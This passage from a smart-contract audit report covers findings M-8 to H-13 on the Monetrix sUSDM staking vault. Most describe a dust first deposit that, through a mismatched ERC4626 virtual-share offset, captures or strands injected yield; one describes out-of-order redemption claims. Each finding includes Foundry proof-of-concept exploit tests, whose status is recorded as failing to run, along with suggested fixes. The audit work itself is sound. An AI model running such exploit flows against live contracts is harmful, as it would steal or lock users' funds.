        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));
    }

    function testDustSupplyLocksHalfOfInjectedYieldInVirtualShares() public {
        address attacker = address(uint160(0xBEEF));
        usdm.mint(attacker, 1);

        vm.startPrank(attacker);
        usdm.approve(address(susdm), 1);
        uint256 shares = susdm.deposit(1, attacker);
        vm.stopPrank();
        assertEq(shares, 1e6);

        uint256 yieldAmount = 1_000_000e6;
        usdm.mint(address(this), yieldAmount);
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);
        uint256 assetsBefore = susdm.totalAssets();

        vm.prank(attacker);
        susdm.cooldownShares(susdm.balanceOf(attacker));

        assertEq(susdm.totalSupply(), 0);
        uint256 trapped = susdm.totalAssets();
        assertGt(trapped, 499_000e6);
        assertEq(usdm.balanceOf(address(escrow)) + trapped, assetsBefore);
    }
}


## Suggested Mitigation
Align the ERC4626 offset with the displayed share decimals. For a 6-decimal sUSDM token over a 6-decimal USDM asset, return 0 from _decimalsOffset(), or keep the virtual offset only if share decimals are increased consistently. Also require a meaningful minimum real totalSupply before injectYield, or seed/burn initial liquidity so yield cannot be distributed into a dust-sized supply.
```

### M-8 / `cFiYburwlcqePVE8VHj0P`
- Finding title: ERC4626 virtual shares can permanently strand injected yield when sUSDM supply is dust-sized
- Report lines: 835-956
```md
## [M-8]. ERC4626 virtual shares can permanently strand injected yield when sUSDM supply is dust-sized

## id: cFiYburwlcqePVE8VHj0P

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch / AccountingInvariantViolation

## Exploit Type
ERC4626SharePrice

## Location
sUSDM._decimalsOffset, injectYield, cooldownShares

## Finding Status: Valid
### Finding Status Justification: The claimed invariant is supported by the sUSDM design: users should realize yield via exchange-rate appreciation and exit through cooldown. The code violates this under dust supply because _decimalsOffset() adds 1e6 virtual shares while decimals() remains 6. A 1-base-unit first deposit creates real shares comparable to the virtual shares; injectYield can then add large assets because totalSupply() > 0. When all real shares are cooled down, convertToAssets returns only the real-share fraction and the balance attributed to virtual shares remains in sUSDM with no owner. There is no meaningful supply threshold or sweep. It overlaps V12's low-severity virtual-share issue but severity differs, so it remains in scope.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 decimals but also sets `_decimalsOffset()` to 6. OpenZeppelin ERC4626 conversion math therefore adds 1e6 virtual shares while the displayed share token still has only 6 decimals. A first deposit of 1 USDM base unit mints 1e6 raw shares, exactly matching the virtual-share constant. If the vault later injects real yield while this dust supply is the only real supply, roughly half of the vault assets are attributed to the virtual shares rather than to the real staker. When the real staker cools down all shares, only the real-share portion is moved to escrow and the remaining USDM stays in sUSDM with `totalSupply() == 0`, leaving it economically unclaimable.

Vulnerable snippets:
`function _decimalsOffset() internal pure override returns (uint8) { return 6; }`
`function decimals() public pure override returns (uint8) { return 6; }`
`require(totalSupply() > 0, "sUSDM: no stakers"); IERC20(asset()).safeTransferFrom(msg.sender, address(this), usdmAmount);`
`uint256 assets = convertToAssets(shares); _burn(msg.sender, shares); totalPendingClaims += assets; escrow.deposit(assets);`

## Impact
A permissionless dust staker can make normal vault yield injection allocate a material fraction of real USDM yield to ERC4626 virtual shares. That portion remains in the sUSDM contract after all real shares exit, causing loss of matured yield and breaking the invariant that real stakers can withdraw approximately all vault assets when no pending claims remain.

## Command to Run Test
forge test --match-test testDustSupplyLocksInjectedYieldInVirtualShares

## Proof of Concept
1. The vault is empty.
2. An attacker deposits 1 smallest USDM unit into sUSDM. Because `_decimalsOffset() == 6`, this mints 1e6 raw shares, equal to the 1e6 virtual shares used by ERC4626 math.
3. During normal protocol operation, the bound vault calls `injectYield(1_000_000e6)`.
4. `convertToAssets(totalSupply())` now returns only about half of `totalAssets()` because the other half is assigned to virtual shares.
5. The attacker calls `cooldownShares(totalSupply())`.
6. All real shares are burned, but only about half of the USDM is moved to escrow. The remaining USDM stays in sUSDM while `totalSupply() == 0`, with no real holder able to claim it.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/governance/MonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract SUSDMVirtualShareLockPoC is Test {
    MockUSDM usdm;
    MonetrixAccessController acl;
    MonetrixConfig config;
    sUSDM susdm;
    sUSDMEscrow escrow;

    function setUp() public {
        usdm = new MockUSDM();

        MonetrixAccessController aclImpl = new MonetrixAccessController();
        acl = MonetrixAccessController(address(new ERC1967Proxy(address(aclImpl), abi.encodeCall(MonetrixAccessController.initialize, (address(this))))));
        acl.grantRole(acl.GOVERNOR(), address(this));

        MonetrixConfig cfgImpl = new MonetrixConfig();
        config = MonetrixConfig(address(new ERC1967Proxy(address(cfgImpl), abi.encodeCall(MonetrixConfig.initialize, (address(0xBEEF), address(0xCAFE), address(acl))))));

        sUSDM susdmImpl = new sUSDM();
        susdm = sUSDM(address(new ERC1967Proxy(address(susdmImpl), abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl))))));

        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));
    }

    function testDustSupplyLocksInjectedYieldInVirtualShares() public {
        address attacker = address(0xA11CE);
        uint256 dust = 1;

        usdm.mint(attacker, dust);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), dust);
        uint256 shares = susdm.deposit(dust, attacker);
        vm.stopPrank();

        assertEq(shares, 1e6);
        assertEq(susdm.totalSupply(), 1e6);

        uint256 yieldAmount = 1_000_000e6;
        usdm.mint(address(this), yieldAmount);
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);

        uint256 totalBeforeExit = susdm.totalAssets();
        uint256 realHolderClaimable = susdm.convertToAssets(susdm.totalSupply());
        assertGt(totalBeforeExit - realHolderClaimable, yieldAmount / 3);

        vm.prank(attacker);
        susdm.cooldownShares(shares);

        uint256 lockedInSUSDM = usdm.balanceOf(address(susdm));
        assertEq(susdm.totalSupply(), 0);
        assertGt(lockedInSUSDM, yieldAmount / 3);
        assertGt(usdm.balanceOf(address(escrow)), yieldAmount / 3);
    }
}

## Suggested Mitigation
Make the ERC4626 decimal model internally consistent. If sUSDM should have the same 6 decimals as USDM, return `_decimalsOffset() = 0`. If a 6-decimal offset is desired for inflation protection, expose share decimals as asset decimals plus the offset and update documentation/integrations accordingly. Also consider enforcing a meaningful minimum real share supply before `injectYield` and adding a governed recovery path for any virtual-share residue when `totalSupply() == 0`.
```

### M-9 / `mzmK3kHt4VHqATCWaq0vz`
- Finding title: Redemption claims are first-come-first-served, letting later requests drain scarce escrow liquidity before earlier redeemers
- Report lines: 957-1024
```md
## [M-9]. Redemption claims are first-come-first-served, letting later requests drain scarce escrow liquidity before earlier redeemers

## id: mzmK3kHt4VHqATCWaq0vz

## Derived From Pattern/Invariant
FirstOrLastMoverAdvantage

## Exploit Type
FrontrunMev

## Location
MonetrixVault.claimRedeem

## Finding Status: Valid
### Finding Status Justification: claimRedeem only checks request ownership and cooldown, then pays from the shared RedeemEscrow if it has enough current balance. There is no FIFO cursor, request-age priority, epoching, or pro-rata mechanism. During partial funding, a later matured redeemer can claim before an earlier one and consume scarce liquidity. The docs and code call this a queue through request IDs, but no ordering invariant is enforced. Exploitation requires bank-run or underfunded escrow conditions, so likelihood is occasional.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Redeem requests receive monotonically increasing requestIds, but claimRedeem does not enforce FIFO ordering or pro-rata settlement when RedeemEscrow is partially funded. Any matured request owner can claim as long as the escrow's current USDC balance covers that request, so a later redeemer can front-run earlier claimants and consume scarce liquidity. Vulnerable snippet: `RedeemRequest memory req = redeemRequests[requestId]; ... delete redeemRequests[requestId]; ... IRedeemEscrow(redeemEscrow).payOut(msg.sender, amount);`. The escrow only checks `require(usdc.balanceOf(address(this)) >= amount, "RedeemEscrow: insufficient liquidity")`, not request age or queued priority.

## Impact
During bank-run or partial bridge-back conditions, MEV searchers or secondary-market USDM buyers can redeem at par before earlier queued users, leaving those users unable to claim until future funding. This worsens depeg pressure and turns redemption liquidity into a gas/ordering race rather than an orderly queue.

## Command to Run Test


## Proof of Concept
1. Alice requests redemption for 100 USDM and receives requestId 0. 2. Bob requests redemption later for 100 USDM and receives requestId 1. 3. After cooldown, RedeemEscrow is funded with only 100 USDC. 4. Bob front-runs Alice and calls claimRedeem(1). 5. Bob receives the full 100 USDC. 6. Alice's earlier claimRedeem(0) reverts because the shared escrow is empty.

## Proof of Code
// Add to a Foundry test harness that deploys MonetrixVault, USDM, MonetrixConfig, RedeemEscrow, YieldEscrow and a mock USDC.
function test_laterRequestDrainsPartialEscrowBeforeEarlierRequest() public {
    uint256 amt = 100e6;
    _depositUSDC(alice, amt);
    _depositUSDC(bob, amt);

    vm.startPrank(alice);
    usdm.approve(address(vault), amt);
    uint256 aliceId = vault.requestRedeem(amt);
    vm.stopPrank();

    vm.startPrank(bob);
    usdm.approve(address(vault), amt);
    uint256 bobId = vault.requestRedeem(amt);
    vm.stopPrank();

    assertEq(aliceId, 0);
    assertEq(bobId, 1);
    vm.warp(block.timestamp + config.redeemCooldown());

    usdc.mint(address(redeemEscrow), amt);

    vm.prank(bob);
    vault.claimRedeem(bobId);
    assertEq(usdc.balanceOf(bob), amt);

    vm.prank(alice);
    vm.expectRevert(bytes("RedeemEscrow: insufficient liquidity"));
    vault.claimRedeem(aliceId);
}

## Suggested Mitigation
Enforce redemption ordering or pro-rata settlement. For example, maintain a claim cursor and require requestId == nextClaimableId for full FIFO, or settle partially funded epochs by snapshotting matured obligations and paying all claimants pro-rata from that funding batch.
```

### M-10 / `-vYBRbQ82_TvmIC7yT7Lt`
- Finding title: Dust sUSDM supply can route almost all future user yield into ERC4626 virtual shares
- Report lines: 1025-1063
```md
## [M-10]. Dust sUSDM supply can route almost all future user yield into ERC4626 virtual shares

## id: -vYBRbQ82_TvmIC7yT7Lt

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
MonetrixVault / sUSDM.distributeYield / mint / injectYield

## Finding Status: Valid
### Finding Status Justification: The code path exists: distributeYield only reroutes userShare when susdm.totalSupply() == 0, while sUSDM uses ERC4626 virtual shares via _decimalsOffset() = 6. A 1-share mint into an empty vault can make real supply nonzero while the virtual share denominator dominates later convertToAssets math, making most injected yield economically unreachable. The zero-supply guard is insufficient, and no minimum real supply/asset threshold exists. This is related to a V12 dust/virtual-share issue, but the submitted severity differs, so it is not excluded under the provided duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM uses ERC4626 virtual share math via `_decimalsOffset() = 6`, but `MonetrixVault.distributeYield()` only checks whether real `susdm.totalSupply()` is nonzero before injecting the user yield share. Vulnerable snippets: `if (userShare > 0 && susdm.totalSupply() == 0) { userShare = 0; }` followed by `susdm.injectYield(userShare)`, while sUSDM returns `_decimalsOffset() = 6`. On an empty sUSDM vault, an attacker can call `sUSDM.mint(1, attacker)`, paying only 1 USDM base unit for one real share unit. Future injected yield is then priced against `totalSupply + 1e6` virtual shares, so only about 1 / 1,000,001 of the injected user yield is redeemable by the attacker and almost all of the user yield share becomes trapped in sUSDM behind virtual shares instead of being rerouted to the foundation as intended for empty supply.

## Impact
A permissionless dust staker can cause a large settled user yield distribution to become economically inaccessible, destroying mature sUSDM-holder yield. This can affect up to the configured user yield share of a distribution and can be repeated whenever real sUSDM supply returns to dust or zero.

## Command to Run Test


## Proof of Concept
1. Wait until sUSDM real supply is zero, or until launch before legitimate stakers enter. 2. Acquire at least 1 USDM base unit. 3. Call `sUSDM.mint(1, attacker)`, creating one real share unit. 4. When the operator calls `distributeYield()`, the vault sees nonzero `susdm.totalSupply()` and injects `userShare` into sUSDM. 5. Because ERC4626 conversion includes 1e6 virtual shares, the attacker's one share can redeem only a microscopic fraction of the injected yield and nearly all injected USDM is stranded.

## Proof of Code
function testDustMintCapturesInjectedYieldIntoVirtualShares() public { uint256 userShare = 700000e6; deal(address(usdm), attacker, 1); vm.startPrank(attacker); usdm.approve(address(susdm), 1); susdm.mint(1, attacker); vm.stopPrank(); assertEq(susdm.totalSupply(), 1); deal(address(usdm), address(vault), userShare); vm.startPrank(address(vault)); usdm.approve(address(susdm), userShare); susdm.injectYield(userShare); vm.stopPrank(); uint256 redeemable = susdm.convertToAssets(susdm.balanceOf(attacker)); assertLt(redeemable, userShare / 1000000); assertGt(usdm.balanceOf(address(susdm)) - redeemable, userShare * 999999 / 1000000); }

## Suggested Mitigation
Do not use `totalSupply() != 0` as the eligibility check. Add a minimum real supply or minimum real assets threshold that is materially larger than the virtual-share offset before routing yield to sUSDM, or snapshot eligible sUSDM supply at settlement time and distribute only to that checkpointed base. Alternatively remove the large virtual offset or enforce a minimum initial stake that makes virtual-share capture negligible.
```

### M-11 / `-jKZwssyjJFqqwQ_Bu9Ih`
- Finding title: Misconfigured ERC4626 decimals offset can strand injected yield in sUSDM virtual shares
- Report lines: 1064-1184
```md
## [M-11]. Misconfigured ERC4626 decimals offset can strand injected yield in sUSDM virtual shares

## id: -jKZwssyjJFqqwQ_Bu9Ih

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM._decimalsOffset/deposit/injectYield/cooldownShares

## Finding Status: Valid
### Finding Status Justification: The vulnerable code is present: totalAssets is the live USDM balance, decimals() returns 6, and _decimalsOffset() returns 6. Under OZ ERC4626 math, empty-vault deposits are converted using virtual shares, so a dust first stake can create real supply equal to the virtual-share constant. Subsequent injectYield adds real USDM to totalAssets, but conversion on cooldown attributes a material fraction to virtual shares. Burning all real shares leaves remaining assets in sUSDM with totalSupply() == 0 and no standard withdrawal path. The finding is not mitigated by nonReentrant, pause, or maxYieldPerInjection. It is related to V12 but severity differs, so it is not excluded.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 decimals while also returning a 6-decimal ERC4626 virtual share offset. OpenZeppelin ERC4626 conversion math uses `totalSupply() + 10 ** _decimalsOffset()` and `totalAssets() + 1`, so an empty-vault deposit of 1 USDM base unit mints 1e6 share units. If an attacker is the first staker with a dust deposit, the real supply can be comparable to the 1e6 virtual shares. Later, normal `injectYield()` adds real USDM assets, but a material share of those assets is economically allocated to virtual shares that no one owns. When the attacker cools down all real shares, only the real-share portion is moved to escrow and the virtual-share portion remains stuck in sUSDM with `totalSupply() == 0`.

Vulnerable snippet:
`function totalAssets() public view override returns (uint256) { return IERC20(asset()).balanceOf(address(this)); }`
`function _decimalsOffset() internal pure override returns (uint8) { return 6; }`
`function decimals() public pure override returns (uint8) { return 6; }`
`uint256 assets = convertToAssets(shares); _burn(msg.sender, shares); escrow.deposit(assets);`

## Impact
A permissionless dust first staker can cause later legitimate yield injections to be partially and permanently locked in sUSDM virtual-share accounting. With a 1 base-unit first deposit, roughly half of a subsequent yield injection is left unclaimable after all real shares are cooled down, reducing matured yield available to real stakers and breaking the documented 1:1 initial sUSDM/USDM exchange model.

## Command to Run Test


## Proof of Concept
1. Attacker deposits 1 smallest USDM unit into an empty sUSDM vault and receives 1e6 raw shares because `_decimalsOffset()` is 6.
2. The bound vault later injects yield as part of normal protocol operation.
3. Since real supply is 1e6 and virtual shares are also 1e6, about half of the vault assets are attributed to virtual shares.
4. The attacker calls `cooldownShares(balanceOf(attacker))` to burn all real shares.
5. `totalSupply()` becomes zero, but a material USDM balance remains in sUSDM and cannot be claimed by any real share holder.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {sUSDM} from "src/tokens/sUSDM.sol";
import {sUSDMEscrow} from "src/tokens/sUSDMEscrow.sol";
import {IMonetrixAccessController} from "src/governance/IMonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockConfig {
    uint256 public maxYieldPerInjection = type(uint256).max;
    uint256 public unstakeCooldown = 1 days;
}

contract MockACL is IMonetrixAccessController {
    bytes32 public constant GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) public pure returns (bool) { return true; }
    function checkRole(bytes32, address) external pure {}
}

contract SUSDMVirtualSharesPoC is Test {
    function testDustStakeStrandsInjectedYield() public {
        address attacker = address(0xA11CE);
        address vault = address(0xBEEF);

        MockUSDM usdm = new MockUSDM();
        MockConfig config = new MockConfig();
        MockACL acl = new MockACL();

        sUSDM impl = new sUSDM();
        bytes memory initData = abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)));
        sUSDM susdm = sUSDM(address(new ERC1967Proxy(address(impl), initData)));

        susdm.setVault(vault);
        sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));

        usdm.mint(attacker, 1);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), type(uint256).max);
        uint256 shares = susdm.deposit(1, attacker);
        vm.stopPrank();
        assertEq(shares, 1e6, "1 base unit mints virtual-offset-sized shares");

        uint256 yieldAmount = 1_000_000e6;
        usdm.mint(vault, yieldAmount);
        vm.startPrank(vault);
        usdm.approve(address(susdm), type(uint256).max);
        susdm.injectYield(yieldAmount);
        vm.stopPrank();

        uint256 claimableBeforeExit = susdm.convertToAssets(susdm.balanceOf(attacker));
        assertLt(claimableBeforeExit, (yieldAmount * 2) / 3, "virtual shares capture a material yield share");

        vm.prank(attacker);
        susdm.cooldownShares(susdm.balanceOf(attacker));

        assertEq(susdm.totalSupply(), 0, "all real shares burned");
        uint256 stuck = usdm.balanceOf(address(susdm));
        assertGt(stuck, yieldAmount / 3, "material USDM remains stuck with no real shares");
    }
}


## Suggested Mitigation
For a 6-decimal asset with a 6-decimal share token, return `_decimalsOffset() == 0` or let `decimals()` include the offset consistently. If virtual shares are still desired, choose an offset that does not contradict the displayed share decimals and add minimum initial liquidity or a guarded bootstrap path so yield cannot be injected while real supply is too small relative to virtual shares.
```

### M-12 / `2YnBC8DBhUCnBF2rx0PZk`
- Finding title: Dust first stake lets virtual shares capture and strand injected sUSDM yield
- Report lines: 1185-1299
```md
## [M-12]. Dust first stake lets virtual shares capture and strand injected sUSDM yield

## id: 2YnBC8DBhUCnBF2rx0PZk

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
sUSDM._decimalsOffset/cooldownShares

## Finding Status: Valid
### Finding Status Justification: The described path exists: sUSDM overrides decimals() to 6 and _decimalsOffset() to 6, while OZ ERC4626 conversions use 10**_decimalsOffset() virtual shares. A 1-base-unit first deposit mints 1e6 raw shares, equal to the virtual-share constant. injectYield only requires totalSupply() > 0, so a dust supply can receive large injected yield. cooldownShares then computes assets with convertToAssets before burning and deposits only the real-share portion into escrow, leaving the virtual-share portion in sUSDM once supply reaches zero. There is no minimum sUSDM deposit/supply threshold or recovery path. This is similar to a V12 public low, but the submitted severity differs, so it is in scope under the duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 decimals while also returning a 6-decimal ERC4626 virtual share offset. OpenZeppelin ERC4626 conversions therefore include 1e6 virtual shares in the denominator even though the share token itself is 6 decimals. The vulnerable logic is: `function _decimalsOffset() internal pure override returns (uint8) { return 6; }`, `function decimals() public pure override returns (uint8) { return 6; }`, and `cooldownShares` uses `uint256 assets = convertToAssets(shares); _burn(msg.sender, shares); ... escrow.deposit(assets);`. If the first stake is only 1 USDM base unit, real totalSupply becomes 1e6 raw shares, equal to the virtual share constant. A later legitimate `injectYield` increases `totalAssets`, but when the real holder burns all shares, `convertToAssets(totalSupply())` returns only about half of the assets because the other half is attributed to virtual shares. The remaining USDM stays in sUSDM while `totalSupply() == 0`, so no real share holder can claim it through the cooldown flow. This violates the invariant that real stakers should be able to withdraw approximately all vault assets when no pending claims exist.

## Impact
A permissionless dust first staker can cause a large fraction of legitimate injected USDM yield to be captured by the dust stake and a material fraction to be permanently stranded in sUSDM with no real shares outstanding. This can destroy or misallocate real protocol yield under low-supply conditions.

## Command to Run Test


## Proof of Concept
1. Attacker makes the first sUSDM deposit with 1 smallest USDM unit. 2. Because `_decimalsOffset()` is 6, the attacker receives 1e6 raw shares, matching the 1e6 virtual shares used by ERC4626 math. 3. The trusted vault later performs a normal `injectYield` while `totalSupply() > 0`. 4. Attacker calls `cooldownShares(balanceOf(attacker))`. 5. Only roughly half of the injected assets are moved to escrow and the rest remains in sUSDM after `totalSupply()` becomes zero.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "src/tokens/sUSDM.sol";
import "src/tokens/sUSDMEscrow.sol";
import "src/core/MonetrixConfig.sol";
import "src/governance/IMonetrixAccessController.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockACL is IMonetrixAccessController {
    bytes32 public constant override GUARDIAN = keccak256("MONETRIX_GUARDIAN");
    bytes32 public constant override GOVERNOR = keccak256("MONETRIX_GOVERNOR");
    bytes32 public constant override UPGRADER = keccak256("MONETRIX_UPGRADER");
    bytes32 public constant override OPERATOR = keccak256("MONETRIX_OPERATOR");
    function hasRole(bytes32, address) public pure override returns (bool) { return true; }
    function checkRole(bytes32, address) external pure override {}
}

contract sUSDMVirtualSharePoC is Test {
    MockUSDM usdm;
    sUSDM susdm;
    sUSDMEscrow escrow;
    MonetrixConfig config;
    address attacker = address(0xA11CE);

    function setUp() public {
        MockACL acl = new MockACL();
        usdm = new MockUSDM();
        MonetrixConfig cfgImpl = new MonetrixConfig();
        ERC1967Proxy cfgProxy = new ERC1967Proxy(
            address(cfgImpl),
            abi.encodeCall(MonetrixConfig.initialize, (address(0xBEEF), address(0xF00D), address(acl)))
        );
        config = MonetrixConfig(address(cfgProxy));
        sUSDM impl = new sUSDM();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(proxy));
        escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));
    }

    function testDustStakeStrandsInjectedYieldInVirtualShares() public {
        usdm.mint(attacker, 1);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), 1);
        uint256 minted = susdm.deposit(1, attacker);
        vm.stopPrank();
        assertEq(minted, 1e6);
        assertEq(susdm.totalSupply(), 1e6);

        uint256 yieldAmount = 1_000_000e6;
        usdm.mint(address(this), yieldAmount);
        usdm.approve(address(susdm), yieldAmount);
        susdm.injectYield(yieldAmount);

        vm.prank(attacker);
        susdm.cooldownShares(susdm.balanceOf(attacker));

        assertEq(susdm.totalSupply(), 0);
        assertGt(usdm.balanceOf(address(escrow)), yieldAmount / 3, "dust stake captures material yield");
        assertGt(susdm.totalAssets(), yieldAmount / 3, "material USDM stranded with no shares");
        assertEq(susdm.totalPendingClaims(), usdm.balanceOf(address(escrow)));
    }
}


## Suggested Mitigation
Do not combine a 6-decimal share token with a 6-decimal virtual share offset. Either remove the override so share decimals become asset decimals plus the offset, or set `_decimalsOffset()` to 0 for a 6-decimal share token. Also add a minimum initial deposit or minimum totalSupply threshold before allowing `injectYield`.
```

### H-13 / `562sw6kPJi1oG_WnvmLn0`
- Finding title: Dust first stake captures half of first sUSDM yield injection through virtual-share mis-scaling
- Report lines: 1300-1423
```md
## [H-13]. Dust first stake captures half of first sUSDM yield injection through virtual-share mis-scaling

## id: 562sw6kPJi1oG_WnvmLn0

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit

## Exploit Type
AccountingInvariantViolation

## Location
sUSDM.deposit/injectYield/cooldownShares

## Finding Status: Valid
### Finding Status Justification: The exploit flow is consistent with the supplied code. Empty-vault deposit of 1 USDM base unit mints 1e6 shares because _decimalsOffset() is 6. Those real shares equal the 1e6 virtual shares in OZ conversion math. injectYield accepts the later yield because totalSupply() is nonzero and only caps the per-injection amount. cooldownShares(balanceOf(attacker)) uses convertToAssets, so roughly half of totalAssets is assigned to the real shares and moved to escrow, while the rest remains in sUSDM after all real shares are burned. The effect can be a non-dust theft/stranding of yield. The closest V12 item is Low severity, while this finding is High, so it is not excluded by the duplicate rule.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
sUSDM reports 6 share decimals while also returning a 6 decimal ERC4626 virtual-share offset. OpenZeppelin ERC4626 math therefore adds 1e6 virtual shares even though real shares are also 6-decimal units. A permissionless first depositor can deposit one smallest USDM unit and receive 1e6 raw shares, making the attacker own roughly half of the economic supply once the 1e6 virtual shares are included. injectYield only checks totalSupply() > 0, so this dust stake bypasses the empty-vault guard. When the vault later injects yield, cooldownShares converts the attacker's dust-funded shares into about half of totalAssets, while the rest is left attributed to virtual shares/stranded in sUSDM. Vulnerable snippets: function _decimalsOffset() internal pure override returns (uint8) { return 6; } function decimals() public pure override returns (uint8) { return 6; } require(totalSupply() > 0, "sUSDM: no stakers"); and uint256 assets = convertToAssets(shares); _burn(msg.sender, shares); totalPendingClaims += assets; escrow.deposit(assets);

## Impact
A permissionless dust first depositor can steal roughly 50% of the first injected yield and leave roughly 50% stranded or unpredictably captured by later entrants. With the default maxYieldPerInjection of 1,000,000 USDM, a 0.000001 USDM stake can claim about 500,000 USDM after cooldown, causing direct loss of matured yield intended for legitimate sUSDM holders/protocol distribution.

## Command to Run Test
forge test --match-contract SUSDMDustFirstStakePoC

## Proof of Concept
1. Attacker is the first sUSDM depositor and deposits 1 base unit of USDM. 2. Because decimals() and _decimalsOffset() both return 6, the attacker receives 1e6 raw shares for the dust deposit. 3. The vault sees totalSupply() > 0 and performs a normal injectYield(1_000_000e6). 4. The attacker calls cooldownShares for all their shares; convertToAssets returns about half of the vault's total USDM balance because the attacker shares equal the 1e6 virtual shares. 5. After the unstake cooldown, claimUnstake releases about 500,000 USDM to the attacker, while another about 500,000 USDM remains in sUSDM with totalSupply == 0.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/governance/MonetrixAccessController.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/sUSDMEscrow.sol";

contract MockUSDM is ERC20 {
    constructor() ERC20("USDM", "USDM") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract SUSDMDustFirstStakePoC is Test {
    MockUSDM usdm;
    sUSDM susdm;
    MonetrixConfig config;
    MonetrixAccessController acl;
    address attacker = address(0xA11CE);

    function setUp() public {
        usdm = new MockUSDM();

        MonetrixAccessController aclImpl = new MonetrixAccessController();
        ERC1967Proxy aclProxy = new ERC1967Proxy(
            address(aclImpl),
            abi.encodeCall(MonetrixAccessController.initialize, (address(this)))
        );
        acl = MonetrixAccessController(address(aclProxy));
        acl.grantRole(acl.GOVERNOR(), address(this));

        MonetrixConfig configImpl = new MonetrixConfig();
        ERC1967Proxy configProxy = new ERC1967Proxy(
            address(configImpl),
            abi.encodeCall(MonetrixConfig.initialize, (address(0x1111), address(0x2222), address(acl)))
        );
        config = MonetrixConfig(address(configProxy));
        config.setCooldowns(60, 60);

        sUSDM susdmImpl = new sUSDM();
        ERC1967Proxy susdmProxy = new ERC1967Proxy(
            address(susdmImpl),
            abi.encodeCall(sUSDM.initialize, (address(usdm), address(config), address(acl)))
        );
        susdm = sUSDM(address(susdmProxy));

        sUSDMEscrow escrow = new sUSDMEscrow(address(usdm), address(susdm));
        susdm.setEscrow(address(escrow));
        susdm.setVault(address(this));
    }

    function testDustFirstStakeStealsHalfOfFirstYieldInjection() public {
        usdm.mint(attacker, 1);
        vm.startPrank(attacker);
        usdm.approve(address(susdm), 1);
        uint256 attackerShares = susdm.deposit(1, attacker);
        vm.stopPrank();

        assertEq(attackerShares, 1e6, "dust deposit receives 1 displayed sUSDM");

        uint256 injectedYield = 1_000_000e6;
        usdm.mint(address(this), injectedYield);
        usdm.approve(address(susdm), injectedYield);
        susdm.injectYield(injectedYield);

        uint256 claimable = susdm.convertToAssets(attackerShares);
        assertGt(claimable, injectedYield / 2 - 10, "dust staker can claim about half the injection");

        vm.prank(attacker);
